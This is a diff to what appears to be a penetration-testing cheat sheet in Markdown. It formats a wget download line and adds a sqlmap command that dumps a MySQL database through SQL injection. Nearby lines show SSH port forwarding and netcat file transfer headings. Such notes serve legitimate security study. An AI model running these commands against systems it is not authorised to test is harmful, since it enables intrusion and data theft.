@@ -54,7 +54,7 @@ python3 -m http.server [port] `By default will listen on 8000`<br/>
 
 ### Downloading Files
 
-wget http://<ip>:port/<file>
+`wget http://<ip>:port/<file>`
 
 ### Netcat to download files from target
 
@@ -80,6 +80,9 @@ $ kill %1
 ```
 ### SSH Port Forwarding
 `ssh -L <port_that_is_blockd_>:localhost:<map_blocked_port> <username>@<ip>`
+
+### SQL Map
+`sqlmap -r request.txt --dbms=mysql --dump`
 
 # Windows
 
